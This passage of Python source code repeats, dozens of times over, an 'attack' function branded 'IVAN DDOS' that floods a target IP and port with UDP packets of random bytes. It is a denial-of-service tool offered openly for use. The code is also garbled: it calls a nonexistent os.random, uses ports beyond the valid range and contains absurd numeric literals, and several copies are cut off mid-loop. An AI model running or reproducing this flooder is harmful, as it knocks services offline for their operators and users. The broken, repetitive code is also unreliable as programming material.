        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
